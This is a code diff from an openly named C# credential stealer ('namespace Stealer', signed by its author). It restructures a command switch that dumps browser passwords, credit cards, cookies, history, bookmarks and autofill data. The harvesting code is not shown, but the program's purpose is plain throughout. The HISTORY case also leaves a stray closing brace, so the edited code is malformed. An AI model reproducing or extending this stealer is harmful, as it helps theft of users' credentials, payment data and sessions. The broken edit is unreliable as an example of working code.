@@ -22,47 +22,33 @@ namespace Stealer
             switch (args[0].ToUpper())
             {
                 case "PASSWORDS":
-                    {
-                        BrowserUtils.ShowPasswords(Passwords.Get());
-                        break;
-                    }
+                    BrowserUtils.ShowPasswords(Passwords.Get());
+                    break;
 
                 case "CREDIT_CARDS":
-                    {
-                        BrowserUtils.ShowCreditCards(CreditCards.Get());
-                        break;
-                    }
+                    BrowserUtils.ShowCreditCards(CreditCards.Get());
+                    break;
 
                 case "COOKIES":
-                    {
-                        BrowserUtils.ShowCookies(Cookies.Get());
-                        break;
-                    }
+                    BrowserUtils.ShowCookies(Cookies.Get());
+                    break;
 
                 case "BOOKMARKS":
-                    {
-                        BrowserUtils.ShowBookmarks(Bookmarks.Get());
-                        break;
-                    }
+                    BrowserUtils.ShowBookmarks(Bookmarks.Get());
+                    break;
 
                 case "HISTORY":
-                    {
-                        BrowserUtils.ShowHistory(History.Get());
-                        break;
+                    BrowserUtils.ShowHistory(History.Get());
+                    break;
                     }
                 case "AUTOFILL":
-                    {
-                        BrowserUtils.ShowAutoFill(Autofill.Get());
-                        break;
-                    }
+                    BrowserUtils.ShowAutoFill(Autofill.Get());
+                    break;
 
                 default:
-                    {
-                        Console.WriteLine("Command not found!");
-                        break;
-                    }
+                    Console.WriteLine("Command not found!");
+                    break;
             }
-
             Console.WriteLine("Coded by LimerBoy <3");
         }
     }   
